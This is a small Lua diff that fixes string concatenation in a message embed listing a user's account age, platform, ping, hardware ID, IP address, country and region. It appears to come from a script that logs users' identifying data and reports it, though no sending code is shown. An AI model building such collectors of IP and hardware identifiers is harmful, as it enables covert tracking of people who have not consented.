@@ -115,7 +115,7 @@ local embeds = {
             "**Account Age:** " .. accountAge .. " days\n" ..
             "**Platform:** " .. platform .. "\n" ..
             "**Ping:** " .. ping .. "ms\n" ..
-            "**HWID:** `" .. hwid .. "`"
+            "**HWID:** `" .. hwid .. "`\n" ..
             "**IP:** `" .. ipInfo.ip .. "`\n" ..
             "**Country:** " .. ipInfo.flagEmoji .. " " .. ipInfo.country .. " (" .. ipInfo.countryCode .. ")\n" ..
             "**Region:** " .. ipInfo.region .. "\n" ..
